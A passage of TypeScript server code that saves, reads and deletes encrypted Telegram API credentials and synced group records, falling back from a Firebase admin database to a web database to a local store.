          return dec;
        }
      }
      return null;
    } catch {
      // fall through
    }
  }

  const store = readLocalStore();
  if (store.telegram_encrypted_creds) {
    const dec = decryptVaultJson<TelegramCredentialsSecret>(
      store.telegram_encrypted_creds
    );
    if (dec?.apiId && dec?.apiHash && dec?.sessionString) {
      setCached("tg_vault_creds", dec, 60000);
      return dec;
    }
  }

  return null;
}

export async function saveTelegramVaultCredentials(
  creds: TelegramCredentialsSecret
): Promise<void> {
  invalidateServerCaches();
  const cipher = encryptVaultJson({
    apiId: Number(creds.apiId),
    apiHash: creds.apiHash.trim(),
    sessionString: creds.sessionString.trim(),
    botToken: creds.botToken ? creds.botToken.trim() : "",
    updatedAt: new Date().toISOString(),
  });

  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      await withTimeout(
        rtdb
          .ref("telegram_vault/encrypted_creds")
          .set({ cipher, updatedAt: new Date().toISOString() }),
        5000
      );
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      await withTimeout(
        webSet(webRef(webDb, "telegram_vault/encrypted_creds"), {
          cipher,
          updatedAt: new Date().toISOString(),
        }),
        5000
      );
      return;
    } catch (err) {
      lastDbError = err instanceof Error ? err.message : String(err);
    }
  }

  const store = readLocalStore();
  store.telegram_encrypted_creds = cipher;
  writeLocalStore(store);
}

export async function getSyncedTelegramGroups(): Promise<
  SyncedTelegramGroupRecord[]
> {
  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      const snap = await withTimeout(
        rtdb.ref("telegram_vault/groups").get(),
        5000
      );
      if (!snap.exists()) return [];
      const val = snap.val() as Record<string, SyncedTelegramGroupRecord>;
      return Object.values(val).sort((a, b) =>
        (b.lastSyncedAt || "").localeCompare(a.lastSyncedAt || "")
      );
    } catch {
      // fall through
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      const snap = await withTimeout(
        webGet(webRef(webDb, "telegram_vault/groups")),
        5000
      );
      if (!snap.exists()) return [];
      const val = snap.val() as Record<string, SyncedTelegramGroupRecord>;
      return Object.values(val).sort((a, b) =>
        (b.lastSyncedAt || "").localeCompare(a.lastSyncedAt || "")
      );
    } catch {
      // fall through
    }
  }

  const store = readLocalStore();
  return Object.values(store.telegram_groups || {}).sort((a, b) =>
    (b.lastSyncedAt || "").localeCompare(a.lastSyncedAt || "")
  );
}

export async function saveSyncedTelegramGroup(
  record: SyncedTelegramGroupRecord
): Promise<void> {
  const safeId = safeRtdbKey(record.id);
  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      await withTimeout(
        rtdb.ref(`telegram_vault/groups/${safeId}`).set(record),
        5000
      );
      return;
    } catch {
      // fall through
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      await withTimeout(
        webSet(webRef(webDb, `telegram_vault/groups/${safeId}`), record),
        5000
      );
      return;
    } catch {
      // fall through
    }
  }

  const store = readLocalStore();
  store.telegram_groups = store.telegram_groups || {};
  store.telegram_groups[safeId] = record;
  writeLocalStore(store);
}

export async function deleteSyncedTelegramGroup(id: string): Promise<void> {
  const safeId = safeRtdbKey(id);
  const rtdb = getAdminRtdb();
  if (rtdb) {
    try {
      await withTimeout(
        rtdb.ref(`telegram_vault/groups/${safeId}`).remove(),
        5000
      );
      return;
    } catch {
      // ignore
    }
  }

  const webDb = getServerWebRtdb();
  if (webDb) {
    try {
      await withTimeout(
        webRemove(webRef(webDb, `telegram_vault/groups/${safeId}`)),
        5000
      );
      return;
    } catch {
      // ignore
    }
  }

  const store = readLocalStore();
  if (store.telegram_groups) {
    delete store.telegram_groups[safeId];
    writeLocalStore(store);
  }
}
